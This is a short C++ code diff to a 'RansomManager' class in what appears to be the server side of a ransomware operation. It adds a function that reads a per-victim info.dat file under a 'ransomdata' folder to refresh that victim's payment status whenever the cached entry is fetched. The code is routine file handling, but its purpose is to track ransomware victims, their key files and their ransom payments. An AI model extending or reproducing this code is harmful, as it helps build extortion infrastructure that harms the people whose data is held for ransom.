@@ -10,6 +10,7 @@ RansomEntry RansomManager::getEntry(std::uint64_t clientId)
 	auto it = entryCache_.find(clientId);
 	if (it != entryCache_.end())
 	{
+		refreshPaymentStatus(it->second);
 		return it->second;
 	}
 
@@ -52,4 +53,10 @@ void RansomManager::saveEntry(RansomEntry & ransomEntry)
 	if (!privateFile) throw EntrySavingError();
 
 	ransomEntry.saveToFile(privateFile, publicFile, infoFile);
+}
+
+void RansomManager::refreshPaymentStatus(RansomEntry & ransomEntry)
+{
+	std::ifstream infoFile("ransomdata/" + std::to_string(ransomEntry.clientId()) + "/info.dat", std::ios::binary);
+	ransomEntry.refreshPaymentStatus(infoFile);
 }
